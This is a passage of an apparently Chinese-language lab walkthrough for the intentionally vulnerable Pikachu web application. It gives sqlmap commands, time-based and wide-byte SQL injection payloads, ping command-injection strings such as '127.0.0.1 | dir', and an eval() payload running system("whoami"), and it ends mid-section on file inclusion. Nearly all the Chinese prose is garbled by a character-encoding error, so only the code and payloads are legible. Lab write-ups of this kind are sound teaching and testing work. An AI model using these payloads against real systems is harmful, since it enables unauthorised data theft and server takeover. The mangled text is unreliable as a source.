#### ä½¿ç”¨ sqlmap è¿›è¡Œå¸ƒå°”ç›²æ³¨ï¼š
```bash
python3 sqlmap.py -u "http://pikachu:8765/vul/sqli/sqli_blind_b.php?name=vince&submit=%E6%9F%A5%E8%AF%A2"
```

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623894.png)





è¿™æ˜¯ç»™å‡ºæœ€ç»ˆ payloadï¼šï¼ˆè¿™æ˜¯ä¸€ä¸ªæ—¶é—´ç›²æ³¨çš„æ¨¡æ¿ï¼Œï¼‰

```bash
sqlmap identified the following injection point(s) with a total of 100 HTTP(s) requests:
---
Parameter: name (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=vince' AND (SELECT 2392 FROM (SELECT(SLEEP(5)))keVW) AND 'zMCL'='zMCL&submit=%E6%9F%A5%E8%AF%A2
---
```



ç»§ç»­è®© sqlmap çˆ†æ•°æ®åº“åï¼š

```bash
python3 sqlmap.py -u "http://pikachu:8765/vul/sqli/sqli_blind_b.php?name=vince&submit=%E6%9F%A5%E8%AF%A2" --dbs
```



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634467.png)





## 4.9 åŸºäºæ—¶é—´çš„ç›²æ³¨


 **é€šè¿‡æ¡ä»¶æˆç«‹æ—¶å¼ºåˆ¶å»¶è¿Ÿ SQL æ‰§è¡Œï¼Œç”¨å“åº”æ—¶é—´åˆ¤æ–­çœŸå‡ã€‚  **



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622238.png)

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615606.png)





**æ‰‹å·¥æ³¨å…¥ï¼š**

<font style="color:rgb(51, 51, 51);">ä½¿ç”¨</font>**<font style="color:rgb(51, 51, 51);">sleep()</font>**<font style="color:rgb(51, 51, 51);">å‡½æ•°ï¼š</font>

`<font style="color:rgb(51, 51, 51);">vince' and sleep(3)--+ </font>`<font style="color:rgb(51, 51, 51);">é¡µé¢å»¶æ—¶3ç§’è¿”å›ï¼Œè¯´æ˜æ­¤å¤„å­˜åœ¨æ—¶é—´ç›²æ³¨æ¼æ´</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634133.png)









## 4.10 å®½å­—èŠ‚æ³¨å…¥
**å®½å­—èŠ‚æ³¨å…¥** 

æ³¨å…¥æ­£å¸¸çš„å‚æ•°ï¼Œç½‘é¡µå›æ˜¾æ­£å¸¸ä¿¡æ¯ã€‚æ³¨å…¥å•å¼•å·å¯¹å‚æ•°è¿›è¡Œé—­åˆï¼Œç½‘é¡µè™½ç„¶è¿”å›äº†æ­£ç¡®çš„ä¿¡æ¯ï¼Œä½†æ˜¯**å¯¹å•å¼•å·è¿›è¡Œäº†è½¬ä¹‰**ã€‚

ä¾‹å¦‚è¾“å…¥ `?id=1'` å®é™…ä¸Šä¼šå˜æˆ `?id=1\'`



å®½å­—èŠ‚æ³¨å…¥ï¼ˆ**GBK/Big5 Character Encoding SQL Injection**ï¼‰æ˜¯ä¸€ç§åˆ©ç”¨æ•°æ®åº“å­—ç¬¦é›†ä¸Webåº”ç”¨å±‚å­—ç¬¦ç¼–ç ä¸ä¸€è‡´ï¼Œç»“åˆè½¬ä¹‰å‡½æ•°ï¼ˆå¦‚`addslashes`ï¼‰ç¼ºé™·çš„SQLæ³¨å…¥æ”»å‡»æ–¹å¼ã€‚

**æ¼æ´åŸç†**

1. **å­—ç¬¦é›†è½¬æ¢é—®é¢˜**
    - å½“æ•°æ®åº“ä½¿ç”¨GBKç­‰å¤šå­—èŠ‚ç¼–ç æ—¶ï¼ŒæŸäº›å­—ç¬¦ï¼ˆå¦‚`0xbf5c`ï¼‰ä¼šè¢«è§†ä¸ºä¸€ä¸ªåˆæ³•å­—ç¬¦ï¼ˆå¦‚`ç¸—`ï¼‰ï¼Œè€Œéä¸¤ä¸ªç‹¬ç«‹å­—èŠ‚ã€‚
    - æ”»å‡»è€…é€šè¿‡è¾“å…¥`%bf%27`ï¼ˆ`0xbf` + `'`çš„URLç¼–ç `%27`ï¼‰ï¼Œè§¦å‘å­—ç¬¦é›†è½¬æ¢é”™è¯¯ã€‚
2. **è½¬ä¹‰å‡½æ•°ç»•è¿‡**
    - PHPçš„`addslashes`æˆ–`mysql_real_escape_string`ä¼šå°†å•å¼•å·`'`è½¬ä¹‰ä¸º`\'`ï¼ˆå³`%5c%27`ï¼‰ã€‚
    - å½“è¾“å…¥`%bf%27`æ—¶ï¼Œè½¬ä¹‰åçš„å­—ç¬¦ä¸²å˜ä¸º`%bf%5c%27`ã€‚ç”±äºGBKå°†`%bf%5c`è§£æä¸ºåˆæ³•å­—ç¬¦`ç¸—`ï¼Œå‰©ä¸‹çš„`%27`ï¼ˆ`'`ï¼‰æœªè¢«è½¬ä¹‰ï¼Œå¯¼è‡´æ³¨å…¥ã€‚



å¯¹äºä¸€èˆ¬çš„è½¬ä¹‰å­—ç¬¦ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•æ„é€ æ³¨å…¥çš„ payload çš„ï¼Œä½†è¿™å¹¶ä¸ä»£è¡¨ç½‘é¡µå°±æ²¡æœ‰ä»»ä½•æ¼æ´å¯ä»¥æ³¨å…¥ã€‚å¯¹**å®½å­—èŠ‚æ³¨å…¥æ¼æ´**è¿›è¡Œæµ‹è¯•ï¼Œæ³¨å…¥å¦‚ä¸‹å‚æ•°ã€‚

```sql
?id=1%df'
```

å½“æ•°æ®åº“çš„ç¼–ç é‡‡ç”¨ **GBK å›½æ ‡ç **æ—¶ï¼Œè™½ç„¶å•å¼•å·è¿˜æ˜¯ä¼šåŠ ä¸Šåæ–œæ ä»è€Œè¢«è½¬ä¹‰ï¼Œä½†æ˜¯ â€œ%dfâ€ ä¼šå’Œåæ–œæ çš„ URL ç¼–ç  â€œ%5Câ€ é—­åˆï¼Œä»è€Œæ„æˆ GBK å›½æ ‡ç ä¸­çš„æ±‰å­—â€œé€£â€ï¼Œä½¿å¾—ç”¨äºè½¬ä¹‰çš„åæ–œæ è¢«æˆ‘ä»¬â€œåƒæ‰â€äº†ã€‚

è¿™ç§æ“ä½œæ˜¯ç”±äº GBK å›½æ ‡ç æ˜¯åŒå­—èŠ‚è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œå› æ­¤å¯¼è‡´äº†åæ–œæ å’Œå…¶ä»–çš„å­—ç¬¦å…±åŒè¡¨ç¤ºä¸ºä¸€ä¸ªæ±‰å­—ã€‚è¿™å¯ä»¥è®©æ•°æ®åº“çš„ SQL æŸ¥è¯¢äº†æ­£ç¡®çš„å‚æ•°(æ±‰å­—)ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨ UNION è¯­å¥è¿›è¡Œæ³¨å…¥ã€‚







`name=1%df' or 1=1-- q` <font style="color:rgb(51, 51, 51);">æŸ¥è¯¢å‡ºæ‰€æœ‰ç”¨æˆ·çš„æ•°æ®</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635517.png)



å¯ä»¥ç»“åˆ unionï¼š

`1%df' union select 1,2-- q` 

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634111.png)

`1%df' union select database(),version()-- q` 

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051620995.png)







# 5ã€RCE
> **<font style="color:rgb(57, 57, 57);">RCE(remote command/code execute)æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</font>
>
> **<font style="color:rgb(57, 57, 57);">è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</font>**<font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£  
</font><font style="color:rgb(57, 57, 57);">æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Š  
</font><font style="color:rgb(57, 57, 57);">ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨  

</font><font style="color:rgb(57, 57, 57);">ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡"è‡ªåŠ¨åŒ–è¿ç»´å¹³å°"è¿›è¡Œæ“ä½œã€‚ åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„"æ”¶è·"-_-</font>
>
> <font style="color:rgb(57, 57, 57);">  
</font>**<font style="color:rgb(57, 57, 57);">è¿œç¨‹ä»£ç æ‰§è¡Œ</font>**<font style="color:rgb(57, 57, 57);">  
</font><font style="color:rgb(57, 57, 57);">åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</font>
>
> <font style="color:rgb(57, 57, 57);">ä½ å¯ä»¥é€šè¿‡â€œRCEâ€å¯¹åº”çš„æµ‹è¯•æ ç›®ï¼Œæ¥è¿›ä¸€æ­¥çš„äº†è§£è¯¥æ¼æ´ã€‚</font>
>





## 5.1 exec "ping"
<font style="color:rgb(33, 37, 41);">åœ¨ç¬¬åå‘¨çš„ç»ƒä¹  [GXYCTF2019]Ping Ping Ping ä¸­ï¼Œæˆ‘ä»¬åšè¿‡åŒæ ·çš„é¢˜ç›®</font>

> ### 1ã€å¯ä»¥é€šè¿‡ `;` ï¼Œåˆ†å‰²å‘½ä»¤ï¼Œ**é¡ºåºæ‰§è¡Œ**ï¼Œå‰ä¸€ä¸ªå¤±è´¥ä¹Ÿä¸å½±å“åä¸€ä¸ª
> <!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051623886.png)
>
> ### <font style="color:rgb(33, 37, 41);">2ã€</font>`<font style="color:rgb(33, 37, 41);">&&</font>`<font style="color:rgb(33, 37, 41);">ï¼ˆå‰ä¸€ä¸ªæˆåŠŸï¼Œæ‰æ‰§è¡Œä¸‹ä¸€ä¸ªï¼‰</font>
> <!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627352.png)
>
> ### <font style="color:rgb(33, 37, 41);">3ã€</font>`<font style="color:rgb(33, 37, 41);">||</font>`<font style="color:rgb(33, 37, 41);">ï¼ˆå‰ä¸€ä¸ªå¤±è´¥ï¼Œæ‰æ‰§è¡Œä¸‹ä¸€ä¸ªï¼‰</font>
> <!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619270.png)
>
> 
>



### æ€»ç»“ä¸€ä¸‹è¿æ¥ç¬¦ï¼š
#### Windowsç³»ç»Ÿï¼š
`|`ï¼šåªæ‰§è¡Œåé¢çš„è¯­å¥ã€‚  
`||`ï¼šå¦‚æœå‰é¢çš„è¯­å¥æ‰§è¡Œå¤±è´¥ï¼Œåˆ™æ‰§è¡Œåé¢çš„è¯­å¥ã€‚  
`&`ï¼šä¸¤æ¡è¯­å¥éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸æ‰§è¡Œåé¢çš„è¯­å¥ã€‚  
`&&`ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡ï¼Œåˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸å†æ‰§è¡Œåé¢çš„è¯­å¥ï¼›å‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚

#### Linuxç³»ç»Ÿï¼š
`;`ï¼šæ‰§è¡Œå®Œå‰é¢çš„è¯­å¥å†æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå½“æœ‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥æ—¶ï¼Œä¸ä¼šå½±å“å…¶å®ƒè¯­å¥çš„æ‰§è¡Œã€‚  
`|`ï¼ˆç®¡é“ç¬¦ï¼‰ï¼šåªæ‰§è¡Œåé¢çš„è¯­å¥ã€‚  
`||`ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼šåªæœ‰å‰é¢çš„è¯­å¥æ‰§è¡Œå‡ºé”™æ—¶ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚  
`&`ï¼ˆåå°ä»»åŠ¡ç¬¦ï¼‰ï¼šä¸¤æ¡è¯­å¥éƒ½æ‰§è¡Œï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦‚æœå‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸æ‰§è¡Œåé¢çš„è¯­å¥ã€‚  
`&&`ï¼ˆé€»è¾‘ä¸ï¼‰ï¼šå¦‚æœå‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œä¹Ÿä¸å†æ‰§è¡Œåé¢çš„è¯­å¥ï¼›å‰é¢çš„è¯­å¥ä¸ºçœŸåˆ™ä¸¤æ¡å‘½ä»¤éƒ½æ‰§è¡Œï¼Œå‰é¢çš„è¯­å¥åªèƒ½ä¸ºçœŸã€‚  
````ï¼ˆå‘½ä»¤æ›¿æ¢ï¼‰ï¼šå½“ä¸€ä¸ªå‘½ä»¤è¢«è§£ææ—¶ï¼Œå®ƒé¦–å…ˆä¼šæ‰§è¡Œåå¼•å·ä¹‹é—´çš„æ“ä½œã€‚ä¾‹ `echo whoami`

  





<font style="color:rgb(33, 37, 41);">è¾“å…¥ 127.0.0.1 ï¼ŒæˆåŠŸæ‰§è¡Œäº† ping å‘½ä»¤</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619552.png)

`127.0.0.1 | dir` æˆåŠŸæ‰§è¡Œäº†`dir`å‘½ä»¤

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624462.png)





## 5.2 exec "eval"
[https://www.runoob.com/php/func-misc-eval.html](https://www.runoob.com/php/func-misc-eval.html)

> # <font style="color:rgb(0, 0, 0);background-color:rgb(250, 252, 253);">PHP</font><font style="color:rgb(0, 0, 0);background-color:rgb(250, 252, 253);"> </font><font style="color:rgb(100, 133, 76);background-color:rgb(250, 252, 253);">eval()</font><font style="color:rgb(0, 0, 0);background-color:rgb(250, 252, 253);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(250, 252, 253);">å‡½æ•°</font>
> [<font style="color:rgb(0, 102, 0);background-color:rgb(250, 252, 253);">PHP Misc å‚è€ƒæ‰‹å†Œ</font>](https://www.runoob.com/php/php-ref-misc.html)
>
> ## <font style="color:rgb(97, 127, 16);background-color:rgb(229, 238, 204);">å®ä¾‹</font>
> <font style="color:rgb(0, 0, 0);background-color:rgb(229, 238, 204);">æŠŠå­—ç¬¦ä¸²å½“æˆ PHP ä»£ç æ¥è®¡ç®—ï¼š</font>
>
> <font style="color:rgb(0, 0, 255);background-color:rgb(249, 249, 249);"><?php</font><font style="color:rgb(0, 0, 139);background-color:rgb(249, 249, 249);">$string</font><font style="color:gray;background-color:rgb(249, 249, 249);"> = </font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">"</font><font style="color:rgb(170, 17, 17);background-color:rgb(249, 249, 249);">beautiful</font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">"</font><font style="color:gray;background-color:rgb(249, 249, 249);">; </font><font style="color:rgb(0, 0, 139);background-color:rgb(249, 249, 249);">$time</font><font style="color:gray;background-color:rgb(249, 249, 249);"> = </font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">"</font><font style="color:rgb(170, 17, 17);background-color:rgb(249, 249, 249);">winter</font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">"</font><font style="color:gray;background-color:rgb(249, 249, 249);">; </font><font style="color:rgb(0, 0, 139);background-color:rgb(249, 249, 249);">$str</font><font style="color:gray;background-color:rgb(249, 249, 249);"> = </font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">'</font><font style="color:rgb(170, 17, 17);background-color:rgb(249, 249, 249);">This is a $string $time morning!</font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">'</font><font style="color:gray;background-color:rgb(249, 249, 249);">; </font><font style="color:green;background-color:rgb(249, 249, 249);">echo</font><font style="color:rgb(0, 0, 139);background-color:rgb(249, 249, 249);">$str</font><font style="color:gray;background-color:rgb(249, 249, 249);">. </font><font style="color:rgb(0, 85, 170);background-color:rgb(249, 249, 249);">PHP_EOL</font><font style="color:gray;background-color:rgb(249, 249, 249);">; </font><font style="color:green;background-color:rgb(249, 249, 249);">eval</font><font style="color:olive;background-color:rgb(249, 249, 249);">(</font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">"</font><font style="color:navy;background-color:rgb(249, 249, 249);">\$</font><font style="color:rgb(170, 17, 17);background-color:rgb(249, 249, 249);">str = </font><font style="color:navy;background-color:rgb(249, 249, 249);">\"</font><font style="color:rgb(0, 0, 139);background-color:rgb(249, 249, 249);">$str</font><font style="color:navy;background-color:rgb(249, 249, 249);">\"</font><font style="color:rgb(170, 17, 17);background-color:rgb(249, 249, 249);">;</font><font style="color:rgb(139, 0, 0);background-color:rgb(249, 249, 249);">"</font><font style="color:olive;background-color:rgb(249, 249, 249);">)</font><font style="color:gray;background-color:rgb(249, 249, 249);">; </font><font style="color:green;background-color:rgb(249, 249, 249);">echo</font><font style="color:rgb(0, 0, 139);background-color:rgb(249, 249, 249);">$str</font><font style="color:gray;background-color:rgb(249, 249, 249);">; </font><font style="color:rgb(0, 0, 255);background-color:rgb(249, 249, 249);">?></font>
>
> <font style="color:rgb(0, 0, 0);background-color:rgb(229, 238, 204);">ä»¥ä¸Šä»£ç æ‰§è¡Œè¾“å‡ºç»“æœä¸º:</font>
>
> <font style="color:rgb(0, 0, 0);background-color:rgb(249, 249, 249);">This is a $string $time morning!  
</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 249, 249);">This is a beautiful winter morning!</font>
>
> ## <font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">å®šä¹‰å’Œç”¨æ³•</font>
> <font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">eval() å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§ PHP ä»£ç æ¥è®¡ç®—ã€‚</font>
>
> <font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">è¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ PHP ä»£ç ï¼Œä¸”å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚</font>
>
> **<font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">æ³¨é‡Šï¼š</font>**<font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">return è¯­å¥ä¼šç«‹å³ç»ˆæ­¢å¯¹å­—ç¬¦ä¸²çš„è®¡ç®—ã€‚</font>
>
> **<font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">æç¤ºï¼š</font>**<font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">è¯¥å‡½æ•°å¯¹äºåœ¨æ•°æ®åº“æ–‡æœ¬å­—æ®µä¸­ä¾›æ—¥åè®¡ç®—è€Œè¿›è¡Œçš„ä»£ç å­˜å‚¨å¾ˆæœ‰ç”¨ã€‚</font>
>
> ## <font style="color:rgb(51, 51, 51);background-color:rgb(250, 252, 253);">è¯­æ³•</font>
> <font style="color:rgb(68, 68, 68);background-color:rgb(246, 244, 240);">eval(</font>_<font style="color:rgb(68, 68, 68);background-color:rgb(246, 244, 240);">phpcode</font>_<font style="color:rgb(68, 68, 68);background-color:rgb(246, 244, 240);">)</font>
>
> _<font style="color:rgb(51, 51, 51);">phpcode </font>_<font style="color:rgb(51, 51, 51);">å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„ PHP ä»£ç ã€‚</font>
>



è¿™ä¸€å…³æ˜¯**å…¸å‹çš„ PHP **`**eval()**`** ä»£ç æ‰§è¡Œæ¼æ´**

ç”¨æˆ·è¾“å…¥ â†’ è¢«æ‹¼æ¥è¿› PHP ä»£ç  â†’ `eval()` æ‰§è¡Œ â†’ ä½ è¾“å…¥ä»€ä¹ˆï¼Œå°±æ‰§è¡Œä»€ä¹ˆ PHP ä»£ç 



æœ€åŸºç¡€çš„ phpinfo();

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624352.png)

æäº¤ä¹‹åï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051630102.png)





è¾“å…¥ï¼š `system("whoami");`  å¯ä»¥çœ‹åˆ°æ‰§è¡Œäº†æ­¤å‘½ä»¤

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051626977.png)





# 6ã€File Inclusion ï¼ˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼‰
> **<font style="color:rgb(57, 57, 57);">File Inclusion(æ–‡ä»¶åŒ…å«æ¼æ´)æ¦‚è¿°</font>**
>
> <font style="color:rgb(57, 57, 57);">æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚ æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼š  
</font><font style="color:rgb(57, 57, 57);">include(),include_once()  
</font><font style="color:rgb(57, 57, 57);">require(),require_once()  
</font><font style="color:rgb(57, 57, 57);">è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚  
</font>
>
> <font style="color:rgb(57, 57, 57);">å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚ æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š  
